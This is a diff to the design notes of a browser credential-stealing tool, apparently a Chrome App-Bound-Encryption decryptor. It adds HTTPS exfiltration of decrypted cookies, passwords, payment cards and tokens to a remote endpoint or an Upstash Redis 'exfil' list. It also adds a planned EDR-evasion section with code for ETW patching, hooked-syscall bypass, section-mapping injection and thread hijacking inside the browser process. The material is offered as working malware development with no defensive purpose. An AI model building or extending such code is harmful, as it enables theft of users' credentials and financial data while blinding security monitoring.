@@ -53,7 +53,9 @@ Chrome-App-Bound-Encryption-Decryption/
 │   │   │                             # drives DataExtractor across all profiles, optionally runs fingerprinter
 │   │   ├── browser_config.hpp        # GetConfigs() — maps browser type string to userDataPath, clsid, iid, iid_v2
 │   │   ├── data_extractor.cpp/.hpp   # ProcessProfile() — opens SQLite DBs (Cookies, Login Data, Web Data)
-│   │   │                             # via duplicated handles, decrypts AES-GCM blobs, writes JSON output files
+│   │   │                             # via duplicated handles, decrypts AES-GCM blobs, exfiltrates via HTTP POST
+│   │   │                             # ExtractCookies/Passwords/Cards/Tokens — all implemented, each POSTs typed JSON envelope
+│   │   │                             # TransmitViaCOM() — WinHttp.WinHttpRequest.5.1; supports Bearer token auth (Upstash etc.)
 │   │   ├── handle_duplicator.cpp/.hpp# NtDuplicateObject syscall — copies file handles to bypass SQLite file locks
 │   │   ├── pipe_client.cpp/.hpp      # Named pipe client — IsValid, ReadConfig, Log, LogDebug helpers
 │   │   └── fingerprint.hpp           # FingerprintExtractor — gathers browser version, extensions, system info
@@ -160,11 +162,13 @@ chromelevator.exe <browser> [options]
     ├─ 5. PayloadInjector::Inject()
     │       a. ChaCha20-decrypt embedded payload byte array → plaintext DLL in local memory
     │       b. Resolve "Bootstrap" export offset from PE headers
-    │       c. NtAllocateVirtualMemory  — allocate RW memory in suspended process
-    │       d. NtWriteVirtualMemory     — write decrypted DLL + pipe name into remote memory
-    │       e. NtProtectVirtualMemory   — flip region to PAGE_EXECUTE_READ
-    │       f. NtCreateThreadEx         — start thread at Bootstrap export, pipe name as argument
-    │          (browser's original main thread stays suspended forever)
+    │       c. [CURRENT]  NtAllocateVirtualMemory + NtWriteVirtualMemory + NtProtectVirtualMemory
+    │          [PLANNED]  NtCreateSection → NtMapViewOfSection (local+remote) — avoids NtWriteVirtualMemory
+    │       d. [CURRENT]  NtCreateThreadEx — start thread at Bootstrap, pipe name as argument
+    │          [PLANNED]  Thread hijacking — NtGetContextThread/NtSetContextThread on existing browser
+    │                     thread; no new thread created, no NtCreateThreadEx telemetry
+    │       e. [PLANNED]  ETW patch — NtTraceEvent stub → ret (0xC3) inside browser process after
+    │                     Bootstrap runs, before any noisy API calls
     │
     ├─ 6. PipeServer::WaitForClient() + SendConfig()
     │       Blocks until payload connects back
@@ -194,9 +198,10 @@ chromelevator.exe <browser> [options]
     │       e. DataExtractor::ProcessProfile() for each profile directory
     │              HandleDuplicator::Duplicate() — NtDuplicateObject to copy locked DB file handles
     │              Open Cookies / Login Data / Web Data via duplicated handles
-    │              SQLite3 query → encrypted blobs
-    │              AES-256-GCM decrypt each blob with master key
-    │              Serialize to JSON → write to output/<Browser>/<Profile>/
+    │              SQLite3 query → encrypted blobs → AES-256-GCM decrypt with master key
+    │              ExtractCookies / ExtractPasswords / ExtractCards / ExtractTokens
+    │              TransmitViaCOM() → HTTPS POST, Content-Type: application/json
+    │                  optional Authorization: Bearer token (Upstash Redis REST pipeline)
     │       f. [optional] FingerprintExtractor::Extract()
     │       g. Send __DLL_PIPE_COMPLETION_SIGNAL__ over pipe
     │       h. FreeLibraryAndExitThread
@@ -223,7 +228,92 @@ Local State (JSON)
             ▼
     AES-256 master key (32 bytes)
             │
-            ├─► Cookies DB  (SQLite) ──► AES-256-GCM decrypt ──► cookies.json
-            ├─► Login Data  (SQLite) ──► AES-256-GCM decrypt ──► passwords.json
-            └─► Web Data    (SQLite) ──► AES-256-GCM decrypt ──► payments.json / ibans.json
+            ├─► Cookies DB  (SQLite) ──► AES-256-GCM decrypt ──► {"type":"cookies",  "data":[...]}
+            ├─► Login Data  (SQLite) ──► AES-256-GCM decrypt ──► {"type":"passwords","data":[...]}
+            ├─► Web Data    (SQLite) ──► AES-256-GCM decrypt ──► {"type":"cards",    "data":[...]}
+            └─► token_service        ──► AES-256-GCM decrypt ──► {"type":"tokens",   "data":[...]}
+                                                    │
+                                        TransmitViaCOM()
+                                        WinHttp.WinHttpRequest.5.1 (COM)
+                                        HTTPS POST https://<targetHost><endpoint>
+                                        Authorization: Bearer <token>  (optional)
+                                                    │
+                                        ┌───────────┴────────────┐
+                                   custom endpoint         Upstash Redis REST
+                                                           /pipeline → LPUSH exfil
 ```
+
+---
+
+## Planned EDR Evasion Implementation
+
+### 1 — RecycledGate (swap out Hell's Gate)
+**File:** `src/sys/internal_api.cpp`
+
+Current Hell's Gate fails when EDR has JMP-patched the ntdll stub. RecycledGate walks ±N
+neighbors to find a clean stub and derives the SSN by offset. Also reuses existing
+`syscall;ret` gadgets inside ntdll — `syscall_trampoline_x64.asm` can be removed entirely.
+
+```
+// Pseudocode — extend existing SSN resolver loop
+if (stub[0] == 0xE9 || stub[4] == 0xE9) {   // JMP at byte 0 or 4 = hooked
+    for (int i = 1; i <= 8; i++) {
+        if (*(stub + i*STUB_SIZE + 4) != 0xE9)     // neighbor not hooked
+            ssn = *(stub + i*STUB_SIZE + 4 + 1) + i; // SSN = neighbor SSN - offset
+    }
+}
+// Return gadget address (syscall;ret) from clean neighbor instead of trampoline
+```
+Ref: https://github.com/thefLink/RecycledGate
+
+---
+
+### 2 — ETW Patch (blind telemetry before noisy calls)
+**File:** `src/sys/bootstrap.cpp` — apply after DLL is mapped, before DllMain runs
+
+Patch `EtwEventWrite` / `NtTraceEvent` in the browser process's ntdll to `ret`:
+
+```cpp
+// Resolve EtwEventWrite via PEB walk (already have PEB walker)
+LPVOID pEtw = /* PEB walk → EtwEventWrite */;
+ULONG oldProtect;
+NtProtectVirtualMemory_syscall(NtCurrentProcess(), &pEtw, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+*(BYTE*)pEtw = 0xC3;  // ret
+NtProtectVirtualMemory_syscall(NtCurrentProcess(), &pEtw, &patchSize, oldProtect, &oldProtect);
+```
+Ref: https://github.com/0xflux/ETW-Bypass-Rust
+
+---
+
+### 3 — NtMapViewOfSection (replace NtWriteVirtualMemory)
+**File:** `src/injector/injector.cpp`
+
+Avoids the `NtWriteVirtualMemory` call that EDRs instrument heavily:
+
+```
+NtCreateSection(SEC_COMMIT | PAGE_EXECUTE_READWRITE)
+NtMapViewOfSection → local  (write payload here)
+NtMapViewOfSection → remote (browser process gets same physical pages)
+// No NtWriteVirtualMemory needed — payload is already in remote VA space
+NtUnmapViewOfSection → local
+```
+Ref: https://github.com/reveng007/DarkWidow
+
+---
+
+### 4 — Thread Hijacking (replace NtCreateThreadEx)
+**File:** `src/injector/injector.cpp`
+
+`NtCreateThreadEx` is heavily logged by every EDR. Hijack an existing idle browser thread instead:
+
+```
+NtGetNextProcess → find browser worker thread
+NtSuspendThread(hThread)
+NtGetContextThread(hThread, &ctx)
+ctx.Rip = Bootstrap_addr
+ctx.Rcx = pipe_name_addr        // first arg
+NtSetContextThread(hThread, &ctx)
+NtResumeThread(hThread)
+// original thread resumes at Bootstrap, not its original RIP
+```
+Ref: https://github.com/0xHossam/Killer
